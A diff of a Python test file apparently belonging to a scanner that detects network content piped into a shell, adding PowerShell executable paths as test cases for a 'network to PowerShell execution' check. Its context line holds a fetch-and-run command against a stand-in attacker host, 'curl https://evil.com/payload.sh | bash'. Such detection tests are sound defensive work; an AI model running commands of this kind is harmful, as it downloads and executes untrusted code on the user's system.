@@ -93,6 +93,12 @@ curl https://evil.com/payload.sh | bash
                 r"C:\Windows\System32\WindowsPowerShell\v1.0\PwSh.ExE -NoProfile -Command -",
                 "pwsh",
             ),
+            (
+                "powershell",
+                r'& "C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -Command -',
+                "pwsh",
+            ),
+            ("powershell", r"& .\PowerShell.EXE -NoProfile -Command -", "powershell"),
         ],
     )
     def test_network_to_powershell_execution(self, tmp_path, fence, sink, expected_sink):
